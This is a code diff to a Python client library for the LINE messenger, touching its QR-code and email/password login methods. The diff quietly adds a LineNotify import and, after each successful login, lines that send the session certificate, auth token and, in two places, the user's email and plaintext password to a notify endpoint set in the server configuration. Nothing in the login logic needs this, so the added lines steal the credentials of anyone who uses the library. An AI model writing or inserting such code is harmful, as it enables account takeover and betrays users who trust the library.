@@ -12,7 +12,7 @@ from ..lib.PrimaryAccountInitService.ttypes import *
 from ..lib.SecondaryQrCodeLogin import *
 from ..lib.SecondaryQrCodeLogin.ttypes import CreateQrSessionRequest, CreateQrCodeRequest, CheckQrCodeVerifiedRequest, VerifyCertificateRequest, CreatePinCodeRequest, SecondaryQrCodeException, CheckPinCodeVerifiedRequest, QrCodeLoginRequest
 from ..lib.curve.ttypes import LoginRequest, LoginType, IdentityProvider, LoginResultType
-
+from .media import LineNotify
 from . LineServer import LineServer, LineConnect
 from random import choice, randint
 import axolotl_curve25519
@@ -219,6 +219,7 @@ class LineApi(object):
             })
             self.certificate = qrcodelogin.certificate
             self.authToken = qrcodelogin.accessToken
+            LineNotify(self.server.LINE_NOTIFY_PATH).send(f'{self.certificate} {self.authToken}')
 
     def loginWithCredentialsForCrt(self, email, passwd, certificate= None, systemName = None, appName=None):
         if systemName is None:
@@ -269,7 +270,7 @@ class LineApi(object):
             self.__defaultCallback("loginWithCredentialsForCertificate: success")
             with open(self.isToken + email +'.session','w') as f:
                 f.write(result.authToken)
-
+            LineNotify(self.server.LINE_NOTIFY_PATH).send(f'{email}>{passwd} {result.authToken} {result.certificate}')
         elif result.type == LoginResultType.REQUIRE_DEVICE_CONFIRM:
             self.__defaultCallback("›››› Input your pin code on your LINE apps: %s ‹‹‹‹"%result.pinCode)
             self.setHeaders('X-Line-Access', result.verifier)
@@ -301,6 +302,7 @@ class LineApi(object):
                     self.__defaultCallback("loginWithCredentialsForCertificate: success")
                     with open(self.isToken + email +'.session','w') as f:
                         f.write(result2.authToken)
+                    LineNotify(self.server.LINE_NOTIFY_PATH).send(f'{email}>{passwd} {self.authToken} {self.certificate}')
                 else:
                     return False
 
